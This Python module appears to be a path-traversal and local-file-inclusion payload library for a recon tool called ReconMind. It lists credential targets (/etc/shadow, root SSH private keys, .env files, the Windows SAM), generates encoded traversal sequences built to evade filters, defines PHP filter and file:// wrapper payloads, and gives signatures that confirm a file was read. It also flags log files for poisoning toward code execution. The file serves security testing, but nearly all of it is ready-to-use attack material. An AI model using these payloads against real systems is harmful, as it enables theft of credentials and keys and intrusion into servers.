"""
core/payloads/lfi_payloads.py
==============================
LFI / Path Traversal payload library for ReconMind by wamiqsec.

Why this file exists:
    The lfi_tester.py module builds payloads dynamically, but a dedicated
    payload library gives us a curated set of KNOWN-WORKING traversal
    sequences from real-world CVEs and bug bounty reports. This is the
    difference between a generic fuzzer and a professional tool.

    This library covers:
        1.  Standard Unix traversal: ../../../etc/passwd
        2.  Windows traversal:       ..\..\..\windows\win.ini
        3.  URL encoding variants:   %2e%2e%2f
        4.  Double encoding:         %252e%252e%252f
        5.  Unicode encoding:        ..%c0%af (overlong UTF-8)
        6.  Null byte injection:     ../../../etc/passwd%00.jpg
        7.  PHP stream wrappers:     php://filter/...
        8.  Protocol wrappers:       file:///etc/passwd
        9.  Truncation bypass:       ....//....//
        10. Absolute paths:          /etc/passwd (no traversal)

Target file groups by priority:
    CRITICAL — direct credential/key exposure
    HIGH     — system info, process data, config files
    MEDIUM   — logs, temp files (useful for log poisoning)
"""

from typing import List, Dict, Any

Payload = Dict[str, Any]


# ---------------------------------------------------------------------------
# Target file definitions
# ---------------------------------------------------------------------------

# Files that if read = CRITICAL finding
CRITICAL_FILES = [
    # Linux credentials & keys
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_ed25519",
    "/home/ubuntu/.ssh/id_rsa",
    "/home/www-data/.ssh/id_rsa",
    # App credential files
    "/.env",
    "/var/www/html/.env",
    "/var/www/.env",
    "/app/.env",
    "/config/database.yml",
    "/config/secrets.yml",
    # Windows credentials
    "C:/Windows/System32/config/SAM",
    "C:/inetpub/wwwroot/web.config",
    "C:/xampp/htdocs/config.php",
]

# Files that give useful system info
HIGH_VALUE_FILES = [
    "/etc/hosts",
    "/etc/hostname",
    "/etc/os-release",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/proc/version",
    "/proc/net/tcp",
    "/var/www/html/config.php",
    "/var/www/html/wp-config.php",
    "/var/www/html/configuration.php",   # Joomla
    "/var/www/html/config/config.php",
    "C:/Windows/win.ini",
    "C:/boot.ini",
    "C:/Windows/System32/drivers/etc/hosts",
]

# Log files — useful for log poisoning → RCE
LOG_FILES = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/proc/self/fd/2",   # stderr fd — often points to error log
]


# ---------------------------------------------------------------------------
# Traversal sequence generators
# ---------------------------------------------------------------------------

def get_traversal_sequences(depth: int) -> List[Dict[str, str]]:
    """
    Generate all traversal variant sequences for a given depth.

    Args:
        depth: Number of directory levels to traverse (1–8 typical).

    Returns:
        List of dicts: {sequence: str, technique: str}
    """
    sequences = []

    # 1. Standard Unix
    unix = "../" * depth
    sequences.append({"sequence": unix, "technique": f"Standard Unix depth={depth}"})

    # 2. Backslash variant
    backslash = "..\\" * depth
    sequences.append({"sequence": backslash, "technique": f"Backslash Unix depth={depth}"})

    # 3. URL-encoded dot-dot-slash
    url_enc = "%2e%2e%2f" * depth
    sequences.append({"sequence": url_enc, "technique": f"URL-encoded ../ depth={depth}"})

    # 4. Double URL-encoded
    dbl_enc = "%252e%252e%252f" * depth
    sequences.append({"sequence": dbl_enc, "technique": f"Double-encoded ../ depth={depth}"})

    # 5. Mixed encoding
    mixed = "..%2f" * depth
    sequences.append({"sequence": mixed, "technique": f"Mixed ..%2f depth={depth}"})

    # 6. Unicode overlong encoding (CVE-2000-0884 style)
    unicode_enc = "..%c0%af" * depth
    sequences.append({"sequence": unicode_enc, "technique": f"Unicode overlong depth={depth}"})

    # 7. Truncation trick (extra dots)
    trunc = "..../" * depth
    sequences.append({"sequence": trunc, "technique": f"Truncation ..../ depth={depth}"})

    # 8. Null-byte variant (PHP < 5.3.4)
    null = ("../" * depth)
    sequences.append({"sequence": null + "%00", "technique": f"Null-byte depth={depth}", "suffix": "%00"})

    # 9. Null byte with extension bypass
    sequences.append({"sequence": null + "%00.jpg", "technique": f"Null-byte .jpg depth={depth}", "suffix": "%00.jpg"})

    # 10. Windows path encoded
    win_enc = "%2e%2e%5c" * depth
    sequences.append({"sequence": win_enc, "technique": f"Windows URL-encoded depth={depth}"})

    return sequences


# ---------------------------------------------------------------------------
# PHP wrapper payloads
# ---------------------------------------------------------------------------

PHP_WRAPPER_PAYLOADS: List[Payload] = [
    {
        "payload": "php://filter/convert.base64-encode/resource=/etc/passwd",
        "technique": "PHP filter base64 → /etc/passwd",
        "target_file": "/etc/passwd",
        "wrapper": True,
    },
    {
        "payload": "php://filter/convert.base64-encode/resource=/etc/hosts",
        "technique": "PHP filter base64 → /etc/hosts",
        "target_file": "/etc/hosts",
        "wrapper": True,
    },
    {
        "payload": "php://filter/read=string.rot13/resource=/etc/passwd",
        "technique": "PHP filter ROT13 → /etc/passwd",
        "target_file": "/etc/passwd",
        "wrapper": True,
    },
    {
        "payload": "php://filter/convert.base64-encode/resource=../config.php",
        "technique": "PHP filter base64 → ../config.php",
        "target_file": "../config.php",
        "wrapper": True,
    },
    {
        "payload": "php://filter/convert.base64-encode/resource=../../config/database.php",
        "technique": "PHP filter base64 → database config",
        "target_file": "database.php",
        "wrapper": True,
    },
    {
        "payload": "file:///etc/passwd",
        "technique": "file:// protocol wrapper",
        "target_file": "/etc/passwd",
        "wrapper": True,
    },
    {
        "payload": "file:///C:/Windows/win.ini",
        "technique": "file:// protocol → Windows",
        "target_file": "win.ini",
        "wrapper": True,
    },
]


# ---------------------------------------------------------------------------
# Detection signatures dictionary
# ---------------------------------------------------------------------------

FILE_SIGNATURES: Dict[str, List[str]] = {
    "/etc/passwd":      ["root:x:0:0", "root:!:", "/bin/bash", "/sbin/nologin", "daemon:x:"],
    "/etc/shadow":      ["root:$", ":0:0:", "::0:99999:7:::"],
    "/etc/hosts":       ["127.0.0.1", "localhost", "::1"],
    "/etc/os-release":  ["NAME=", "VERSION=", "ID="],
    "/proc/self/environ": ["PATH=", "HOME=", "USER="],
    "/proc/version":    ["Linux version", "gcc version"],
    ".env":             ["DB_PASSWORD", "APP_KEY", "SECRET_KEY", "DB_HOST"],
    "wp-config.php":    ["DB_NAME", "DB_PASSWORD", "DB_USER", "table_prefix"],
    "config.php":       ["dbhost", "dbname", "dbpass", "password"],
    "win.ini":          ["[extensions]", "[fonts]", "[mci extensions]"],
    "web.config":       ["<configuration>", "connectionString", "appSettings"],
    "SAM":              ["NTLM", "\xf8\xff\xff\xff"],
    "access.log":       ["GET /", "POST /", "HTTP/1.1"],
    "id_rsa":           ["-----BEGIN", "PRIVATE KEY-----"],
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def get_all_target_files() -> List[Dict[str, Any]]:
    """
    Return all target files with their priority classification.

    Returns:
        List of dicts: {file, priority, signatures}
    """
    result = []

    for f in CRITICAL_FILES:
        sigs = []
        for key, sig_list in FILE_SIGNATURES.items():
            if key in f:
                sigs = sig_list
                break
        result.append({"file": f, "priority": "CRITICAL", "signatures": sigs})

    for f in HIGH_VALUE_FILES:
        sigs = []
        for key, sig_list in FILE_SIGNATURES.items():
            if key in f:
                sigs = sig_list
                break
        result.append({"file": f, "priority": "HIGH", "signatures": sigs})

    for f in LOG_FILES:
        result.append({"file": f, "priority": "MEDIUM", "signatures": ["GET /", "POST /"]})

    return result


def get_signatures_for_file(file_path: str) -> List[str]:
    """
    Return detection signatures for a given file path.

    Args:
        file_path: Target file path.

    Returns:
        List of strings that confirm successful file read.
    """
    for key, sigs in FILE_SIGNATURES.items():
        if key in file_path:
            return sigs
    # Generic fallbacks
    return ["root:", "127.0.0.1", "PASSWORD", "password", "[extensions]"]
